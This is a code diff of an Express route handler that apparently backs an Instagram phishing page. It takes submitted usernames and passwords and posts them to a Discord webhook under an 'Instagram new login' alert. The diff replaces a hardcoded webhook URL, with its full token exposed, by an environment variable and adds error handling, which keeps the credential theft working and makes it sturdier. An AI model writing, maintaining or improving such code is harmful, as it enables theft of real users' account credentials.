@@ -13,14 +13,22 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Validate input
       const formData = loginFormSchema.parse(req.body);
       const { username, password } = formData;
-      const webhookUrl = "https://discord.com/api/webhooks/1351717767585464321/G55PRIVsD7T2AB6yyqD3M_znGaOrwRRezYlqqlOQEXGq4vSQo3rNEWxzZrMJocjoeB93";
+      const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+
+      if (!webhookUrl) {
+        console.error("Discord webhook URL not configured");
+        return res.status(500).json({ 
+          success: false, 
+          message: "Server configuration error" 
+        });
+      }
 
       // Prepare Discord webhook message
       const message = {
         content: "🚨 **Instagram Yeni Giriş** 🚨 @everyone",
         embeds: [{
           title: "Hesap Bilgileri;",
-          color: 16426522, // Instagram pembemsi renk
+          color: 16426522,
           fields: [
             {
               name: "👤 Kullanıcı Adı:",
@@ -48,7 +56,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             'Content-Type': 'application/json',
           }
         });
-        
+
         return res.status(200).json({ success: true, message: "Giriş bilgileri başarıyla gönderildi!" });
       } catch (error) {
         console.error("Discord webhook error:", error);
@@ -65,7 +73,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           message: validationError.message 
         });
       }
-      
+
       console.error("Server error:", error);
       return res.status(500).json({ 
         success: false, 
